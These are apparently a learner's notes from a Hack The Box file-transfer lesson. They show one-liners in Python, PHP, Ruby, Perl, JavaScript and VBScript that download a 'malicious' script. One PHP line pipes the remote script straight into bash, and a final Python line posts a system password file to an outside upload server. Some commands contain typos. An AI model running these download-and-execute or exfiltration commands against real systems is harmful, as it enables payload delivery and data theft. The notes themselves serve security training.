common programming languages to expect to find on linux include Python, PHP, Perl, and ruby, but they can also be installed on windows, though it is less common. 

windows default applications can include `cscript` and `mshta`, to execute Javascript or VBScript code. 

ultimately, find a language, write some code, it's pretty doable on every system you just might have to be creative, or do some hunting 

### Python
typically you'll see python3 but occasionally there is still python2, you can run oneliners with the -c command
##### Python2 - Download
```
n00blyfe@htb$ python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/account/malicious/script.sh", "script.sh")'
```
##### Python3 - Download
```
n00blyfe@htb$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/account/malicious/script.sh", "script.sh")'
```
### PHP
PHP is used by 77.4% of all websites. We will use `file_get_contents()` to download content from a website combined with `file_put_contents()` to save the file into a directory. onelines cane be created with the `-r` flag
```
n00blyfe@htb$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/account/malicious/script.sh"); file_put_contents("script.sh",$file);'
```
alternatively wou could use `fopen()`
##### php download with Fopen()
```
n00blyfe@htb$ php r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/account/malicious/script.sh","rb); $flocal = fopen("script.sh","wb"); while ($buffer = fread($fremote, BUFFER)){ fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
we can also pip the downlodaded content similar to the fileless examples from earlier
##### PHP Download a file and pipe it to Bash
```
n00blyfe@htb$ php -r '$lines = @file("https://raw.githubusercontent.com/account/malicious/script.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
### Other Languages
ruby and perl are both popular alternatives one liners use the `-e` flag 
##### Ruby - Download a file
```
n00blyfe@htb$ ruby -e 'require "net/http"; file.write("script.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/account/malicious/script.sh")))'
```
##### Perl - Download a file
```
n00blyfe@htb$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/account/malicious/script.sh", "script.sh");'
```
### JavaScript
lets you implement complex features on web pages, can also do alot of other things, here's a `wget.js script`
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

you can use the following from cmd or powershell window to execute this JS code and download a file
```
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/account/malicious/script.ps1
script.ps1
```
### VBScript
installed by default on every version of windows since Windows 98you can build wget.vbs below
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
	.type = 1
	.open
	.write xHttp.responseBody
	.savetofile WScript.Arguments.Item(1), 2
end with

```
execute it with the following in cmd or Powershell
```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/account/malicious/script.ps1
script.ps1
```

### Upload Operations using Python3
we can use the python3 requests module to send HTTP requests (GET, POST, PUT, etc) 
##### Start the Python upload server module
```
n00blyfe@htb$ python3 -m uploadserver
```

##### Uploading a File using a Python one-liner
```
n00blyfe@htb$ python3 -c 'import requests; requests.post("http://192.168.49.128:8080/upload", files={"Files":open("/etc/password","rb")})'
```
